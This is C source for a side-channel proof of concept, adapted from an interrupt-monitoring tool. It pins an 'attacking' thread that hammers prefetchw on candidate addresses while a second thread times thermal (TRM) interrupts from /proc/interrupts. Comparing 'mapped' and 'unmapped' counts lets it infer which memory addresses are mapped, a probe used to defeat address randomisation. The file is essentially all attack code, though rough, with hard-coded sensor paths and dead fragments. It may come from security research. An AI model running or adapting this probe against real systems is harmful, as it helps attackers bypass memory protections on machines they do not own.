#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/timerfd.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <x86intrin.h> //rdtscp and clflush
#include <getopt.h>
#include <ctype.h>
#include <stdarg.h>
#include <string.h>
#include <errno.h>
#include <malloc.h>
#include <time.h>
#include <pthread.h>
#include <time.h>
#include <math.h>

#define	NCPU	256			/* Max CPU's we support		 */
#define	NIRQ	256			/* Max IRQ we support		 */

typedef	unsigned long long	sample_t;
#define	SFMT	"%15llu"		/* Exactly 15 characters wide	 */
#define	TFMT	"%15s"			/* Exactly 15 characters wide	 */
#define	CVT	strtoull		/* Text-to-sample converter	 */

#define ATTACK_CORE 2
#define VICTIM_CORE 3
#define INTERVAL 1e7

int inter_count[512][10001];
double score[512]={0},standard[512]={0},var[512]={0},valid_count[512]={0},valid[512]={0};


volatile size_t wait_report=0;
int TRM=0;
static	char *		me = "irqtop";
static	char *		ofile;
static	char *		titles[ NCPU+1 ]; /* CPU{n} we have active	 */
static	char *		irq_names[ NIRQ+1 ]; /* Spelling of IRQ names	 */
static	size_t		ncpu;		/* Number of CPU's we found	 */
static	size_t		nirq;		/* Counts IRQ names we have	 */
static	size_t		nsamples;	/* Elements in sample matrix	 */
static	char *		proc_interrupts = "/proc/interrupts";
static	size_t		debug_level;

static	void
log_entry(
	int		e,
	char const *	fmt,
	...
)
{
	va_list		ap;

	fprintf( stderr, "%s: ", me );
	va_start( ap, fmt );
	vfprintf(
		stderr,
		fmt,
		ap
	);
	va_end( ap );
	if( e )	{
		fprintf(
			stderr,
			"; %s (errno=%d)",
			strerror( e ),
			e
		);
	}
	fprintf( stderr, ".\n" );
}

static	inline	int
on_debug(
	int		level
)
{
	return(
		(level <= debug_level)
	);
}

static	inline	void
debug(
	int		level,
	char const *	fmt,
	...
)
{
	if( on_debug( level ) )	{
		va_list		ap;

		va_start( ap, fmt );
		vfprintf(
			stderr,
			fmt,
			ap
		);
		va_end( ap );
		fprintf(
			stderr,
			".\n"
		);
	}
}

static	inline	void *
xmalloc(
	size_t	n
)
{
	void *	retval = malloc( n );
	if( !retval )	{
		log_entry(
			errno,
			"cannot allocate %d bytes",
			n
		);
		exit( 1 );
		/* NOTREACHED						 */
	}
	return( retval );
}

static	inline	char *
xstrdup(
	const char *	s
)
{
	char * const	retval = strdup( s );

	if( !retval )	{
		log_entry(
			errno,
			"string allocation failure"
		);
		exit( 1 );
	}
	return( retval );
}

static	inline	sample_t *
new_sample_table(
	void
)
{
	size_t const	space_required = nsamples * sizeof( sample_t );
	sample_t * const	retval = xmalloc( space_required );
	return( retval );
}

static	size_t
discover_irq_setup(
	void
)
{
	size_t		retval;

	retval = -1;
	do	{
		FILE *		f;
		char		buf[ BUFSIZ + 1 ];
		char *		tokens[ 1+((BUFSIZ+1)/2) ];
		char *		token;
		char *		bp;

		f = fopen( proc_interrupts, "rt" );
		if( !f )	{
			log_entry(
				errno,
				"cannot open '%s' for reading.",
				proc_interrupts
			);
			break;
		}
		errno = 0;
		if( !fgets( buf, sizeof( buf ), f ) )	{
			log_entry(
				errno,
				"cannot read '%s'",
				proc_interrupts
			);
			break;
		}
		ncpu = 0;
		for(
			bp = buf;
			(token = strtok( bp, " \t\n" )) != NULL;
			bp = NULL
		)	{
			titles[ ncpu++ ] = xstrdup( token );
			if( ncpu >= NCPU )	{
				break;
			}
		}
		titles[ ncpu ] = NULL;
		/*							 */
		nirq = 0;
		while( fgets( buf, sizeof(buf), f ) )	{
			char * const	irq_name = strtok( buf, " \t\n:" );

			irq_names[ nirq++ ] = xstrdup( irq_name );
			//printf("%s,%d\n",irq_names[nirq-1],nirq-1);
			if(strcmp(irq_names[nirq-1],"TRM")==0) {
				TRM=nirq-1;
			}
			if( nirq >= NIRQ )	{
				break;
			}
			/*
			 * We could skip the ncpu-count tokens and then
			 * take the rest of the line as the interrupt
			 * routing description, but maybe in another update.
			 */
			/* Ignore rest of lien				 */
		}
		irq_names[ nirq ] = NULL;
		if( fclose( f ) )	{
			log_entry(
				errno,
				"cannot close '%s'",
				proc_interrupts
			);
			break;
		}
		nsamples = nirq * ncpu;
		retval = 0;
	} while( 0 );
	return( retval );
}

static	sample_t *
take_samples(
	void
)
{
	sample_t * const	retval = new_sample_table();
	do	{
		sample_t * const	space = retval;
		FILE *		f;
		char		buf[ BUFSIZ + 1 ];
		sample_t *	sp;

		f = fopen( proc_interrupts, "rt" );
		if( !f )	{
			log_entry(
				errno,
				"cannot open '%s' for samples",
				proc_interrupts
			);
			break;
		}
		/* The first line is the CPU<n> label line		 */
		if( !fgets( buf, BUFSIZ, f ) )	{
			log_entry(
				errno,
				"cannot read CPU titles from '%s'",
				proc_interrupts
			);
			(void) fclose( f );
			break;
		}
		/* All remaining lines are interrupt counts		 */
		sp = space;
		while( fgets( buf, BUFSIZ, f ) )	{
			char *		bp;
			size_t		cpu_no;

			/* Cheap insurance				 */
			buf[ BUFSIZ ] = '\0';
			/* Walk down line past line title's ":"		 */
			for( bp = buf; *bp && (*bp++ != ':'); );
			/* Take next 'ncpu' columns as irq counts	 */
			for( cpu_no = 0; cpu_no < ncpu; ++cpu_no )	{
				char *	eos;

				while( *bp && isspace( *bp ) )	{
					++bp;
				}
				*sp++ = CVT( bp, &bp, 10 );
			}
			/* Ignore the rest, it's just irq routing	 */
		}
		/* Clean up after ourselves				 */
		if( fclose( f ) )	{
			log_entry(
				errno,
				"failed to close sample source '%s'",
				proc_interrupts
			);
			break;
		}
	} while( 0 );
	return( retval );
}

static	int
parse_args(
	int		argc,
	char * *	argv
)
{
	int		retval;

	opterr = 0;			/* I'll handle the error reporting */
	retval = -1;
	do	{
		int	c;

		while( (c = getopt( argc, argv, "Do:" )) != EOF )	{
			switch( c )	{
			default:
				log_entry(
					0,
					"unknown switch '%c'",
					isalnum( c ) ? c : '_'
				);
				goto	Fini;
			case 'D':
				++debug_level;
				break;
			case 'o':
				ofile = optarg;
				break;
			}
		}
		retval = 0;
	} while( 0 );
Fini:
	return( retval );
}

static	sample_t *
sample_diff(
	sample_t const * old,
	sample_t const * new
)
{
	sample_t * const	retval = new_sample_table();

	do	{
		size_t		remain;
		sample_t *	sp;

		for(
			sp = retval,
			remain = nsamples;
			(remain-- > 0);
			*sp++ = *new++ - *old++
		);
	} while( 0 );
	return( retval );
}

sample_t analyze_samples(
	sample_t *	samples
)
{
	time_t const	now = time( NULL );
	size_t		cpu;
	size_t		irq;
	char		tbuf[ 64 ];
	sample_t ret=0;

	//strftime(
		//tbuf,
		//sizeof(tbuf),
		//"%Y%-m-%d %H:%M:%S",
		//localtime( &now )
	//);
	//printf(
	//	"--- %s\n",
	//	tbuf
	//);
	
	//printf( "%3s:", irq_names[TRM] );
	for( irq = 0; irq < nirq; ++irq )	{
	if(irq==TRM){
		for( cpu = 0; cpu < ATTACK_CORE; ++cpu )	{
		*samples++;
		}
		ret=*samples;
		break;
		
		}
	else {
		for( cpu = 0; cpu < ncpu; ++cpu )	{
			*samples++;
		}
	}
	
	}
	return ret;
	//putchar( '\n' );
	
}


static void pin_cpu(int core)
{
	cpu_set_t mask;

	/* PIN to CPU0 */
	CPU_ZERO(&mask);
	CPU_SET(core, &mask);
	sched_setaffinity(0, sizeof(cpu_set_t), &mask);
}

static	void report()
{

	pin_cpu(VICTIM_CORE);
	//printf("report!\n");
	
	static const	struct timespec	period = {
			0, INTERVAL
		};
		struct itimerspec	interval;
		int		fd;
		sample_t *	old;
		sample_t *	new;
		sample_t *	diff;

		fd = timerfd_create(
			CLOCK_MONOTONIC,
			(0|TFD_CLOEXEC)
		);
		if( fd == -1 )	{
			log_entry(
				errno,
				"cannot create timer"
			);
			exit(0);
		}
		/* Get a baseline sample set				 */
		old = take_samples();
		/* Setup the loop interval				 */
		interval.it_interval = period;
		interval.it_value    = period;
		if( timerfd_settime(
			fd,
			0,
			&interval,
			NULL
		) )	{
			log_entry(
				errno,
				"could not establish timer interval"
			);
			exit(0);
		}
		while(1){
			__uint64_t	icount;
			ssize_t	nbytes;

			nbytes = read( fd, &icount, sizeof( icount ) );
			if( nbytes != sizeof( icount ) )	{
				log_entry(
					errno,
					"short interval read: %lu",
					nbytes
				);
				break;
			}
			if( icount != 1 )	{
				log_entry(
					0,
					"timer interval overrun: %lu",
					icount
				);
			}
			new = take_samples();
			diff = sample_diff( old, new );
			if(analyze_samples( diff )>0)
			{
				wait_report=1;
				//printf("diff=%u,you can end~\n",analyze_samples( diff ));
				pthread_exit(0);
			}
			else{
			//printf("hello\n");
			}
			free( old );
			free( diff );
			old = new;
			}
		exit(0);
	
}


static	void thermal(){
	unsigned int junk;
	pin_cpu(1);
	while(!wait_report){
     	_m_prefetchw(&junk);
     	}
     	exit(0);

}

long thermal_report(int j){
	pthread_t child1,child2;
	unsigned int ret,junk;
	unsigned long long reth0,reth1;
	struct timeval start,end;
	wait_report=0;
	if(pthread_create(&child1, NULL, report, NULL) != 0) {
		printf("thread creation failed\n");
		exit(1);
	}
	
	
	
	//if(pthread_create(&child2, NULL, thermal, NULL) != 0) {
	//	printf("thread creation failed\n");
	//	exit(1);
	//}
	int i,  max = -1, maxi = -1,count=0;
	unsigned int* addr;
	int base=0x80800000;
	unsigned long long M=20*1e8;
	gettimeofday(&start,NULL);

	addr=1024*1024*2*j+base;
	printf("attacking %x\n", 1024*1024*2*j+base);
	while(M--) {
	
	//while (get_gs() == 1);		
     	
     	//get the start of the time slice
        
               
        //create k segmentation fault before count
	
	 _m_prefetchw(addr);
	// count++;
	 
	         
	//use the remaining time slice to count
	
	}
	
	gettimeofday(&end,NULL);
	         
	//use the remaining time slice to count

    	printf("cost %dms, temp=%d\n",(end.tv_sec-start.tv_sec)*1000+(end.tv_usec-start.tv_usec)/1000,get_hwmon());
    	count=0;
	gettimeofday(&start,NULL);
	while(!wait_report) {
	
	//while (get_gs() == 1);		
     	
     	//get the start of the time slice
        
               
        //create k segmentation fault before count

	 sqrt((double)rand());
	 
	 count++;
	 }
	         
	//use the remaining time slice to count
	
	
	gettimeofday(&end,NULL);
	
    	printf("relay %dms\n",(end.tv_sec-start.tv_sec)*1000+(end.tv_usec-start.tv_usec)/1000);
	
	//count=(end.tv_sec-start.tv_sec)*1000+(end.tv_usec-start.tv_usec)/1000;
     	//gettimeofday(&end,NULL);
     	//ret=(end.tv_sec-start.tv_sec)*1e3+(end.tv_usec-start.tv_usec)/1000;
     	//printf("report: %d\n",count/100000);
     	//usleep(1000);
     	return count;

}
int get_hwmon(){
	int ret; 
	FILE *fp=fopen("/sys/devices/platform/coretemp.0/hwmon/hwmon5/temp4_input","r");
	if(fp==NULL)
   {
   	printf("error!\n");
   	return 0;
   }
	fscanf(fp,"%d",&ret);
	
	//printf("temp:%d\n",ret);
	fclose(fp);
	return ret;

}
//process the resultd after access-count(read_addr)

int main(int argc, char ** argv) {
	int retval,ground_truth=0,predict=0;

	ground_truth=get_hwmon();
	
	pin_cpu(ATTACK_CORE);
	

	retval = EXIT_FAILURE;
	
	if( parse_args( argc, argv ) ) {
			log_entry(
				0,
				"illegal parameters; exiting"
			);
			return 0;
		}
		if( ofile )	{
			if( unlink( ofile ) )	{
				if( errno != ENOENT )	{
					log_entry(
						errno,
						"cannot unlink '%s'",
						ofile
					);
					exit( 1 );
					/*NOTREACHED*/
				}
			}
			if( freopen( ofile, "wt", stdout ) != stdout )	{
				log_entry(
					errno,
					"could not redirect to '%s'",
					ofile
				);
				return 0;
			}
			if( ftruncate( STDOUT_FILENO, 0 ) )	{
				log_entry(
					errno,
					"ignoring truncate '%s' failure",
					proc_interrupts
				);
			}
		}
	discover_irq_setup();
	long map[1000],unmap[1000],j;
	
	for(j=0;j<210;j++){
	
	map[j]=thermal_report(208);
	printf("(mapped) %d, %ld, temp=%d\n",j,map[j],get_hwmon());
	sleep(40);
	
	unmap[j]=thermal_report(50);
	printf("(unmapped) %d, %ld, temp=%d\n",j,unmap[j],get_hwmon());
	sleep(40);
	
	}
	
	for(j=0;j<210;j++){
	
	
	}
	
	
	
	
		//printf("see me,111\n");
	FILE *fp=fopen("map-count","w");
	FILE *fp1=fopen("unmap-count","w");
	for(int j=0;j<210;j++)
	{
	      fprintf(fp,"%ld\n",map[j]);
	}
	for(int j=0;j<210;j++)
	{
	      fprintf(fp1,"%ld\n",unmap[j]);
	}


	//compute();
	return 0;

}
